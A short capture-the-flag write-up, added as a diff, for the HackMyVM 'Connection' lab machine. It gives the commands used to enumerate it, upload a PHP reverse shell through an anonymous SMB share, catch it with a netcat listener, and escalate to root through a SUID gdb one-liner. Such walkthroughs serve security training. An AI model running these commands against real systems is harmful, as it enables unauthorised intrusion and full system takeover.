@@ -1,0 +1,76 @@
+### Write up for https://hackmyvm.eu/machines/machine.php?vm=Connection ###
+
+ip=<machine's ip>
+
+nmap -v -T4 -p- -sC -sV -oN nmap.log $ip;clear;cat nmap.log
+
+firefox $ip &
+
+enum4linux -a $ip
+
+////////////////////////////////////////////////////////////////////////////////////////////////
+ ======================================== 
+|    Share Enumeration on $ip    |
+ ======================================== 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        share           Disk      
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (Private Share for uploading files)
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on $ip
+//$ip/share     Mapping: OK, Listing: OK
+//$ip/print$    Mapping: DENIED, Listing: N/A
+//$ip/IPC$      [E] Can't understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+////////////////////////////////////////////////////////////////////////////////////////////////
+
+smbclient //$ip/share
+//login anonymously 
+
+ls
+cd html
+
+//we can upload a reverse shell 
+
+//you can get help with revshells from here wwww.revshells.com
+
+//on a new terminal (pico shell.php) paste code from revshells.com
+
+//back on the smb
+put shell.php
+exit
+
+nc -nlvp 2234
+
+wget $ip/shell.php
+
+//get Better shell envirorment 
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl+z
+
+stty -a
+
+stty raw -echo;fg
+
+export SHELL=bash
+export TERM=xterm
+stty rows (values from stty -a) cols (values from stty -a)
+
+
+find / -perm -u=s 2>/dev/null
+
+//Visit gtfobins
+
+gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit
+
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+
+
+cat /root/proof.txt
+cat /home/connection/local.txt
